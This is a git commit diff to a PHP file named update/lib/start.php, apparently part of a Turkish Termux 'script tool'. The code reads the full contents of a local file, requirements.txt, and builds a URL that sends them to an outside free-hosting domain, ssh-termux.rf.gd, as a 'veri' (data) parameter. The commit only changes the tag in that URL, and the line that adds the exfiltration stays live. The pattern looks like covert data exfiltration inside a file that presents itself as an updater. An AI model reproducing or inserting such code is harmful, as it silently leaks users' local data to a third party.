9475aead6825ce955d1d799184a64f32754ce4f8
FerSReD Official <136520073+FerSReD98@users.noreply.github.com>
2023-07-19 23:55:29 +0300

    Update start.php

--- update/lib/start.php
+++ update/lib/start.php
@@ -5,7 +5,7 @@ ob_start();
 $dosya = fopen('requirements.txt', 'r');
 $icerik = fread($dosya, filesize('requirements.txt'));
 fclose($dosya);
-$url = "http://ssh-termux.rf.gd/?termux-fersred-official-script-tool-turk-siber-timi=yamanefkar-script-tool-turk-siber-timi-date-0-0-1yaman-efkaryamangw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq&veri=".$icerik;
+$url = "http://ssh-termux.rf.gd/?termux-yaman-efkar-script-tool-turk-siber-timi=yamanefkar-script-tool-turk-siber-timi-date-0-0-1yaman-efkaryamangw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq1TrqQbwq/VtII6o6gxdSpTJvYD4feczhBGtALbaJpF28jcE47KvHO2iYA4OI3jsEMdMWskEJmNkyCp9uPR6vGOaVaajpTDBLNPVQMsDgw7Wgq&veri=".$icerik;
 
 
 function replaceSpace($string)
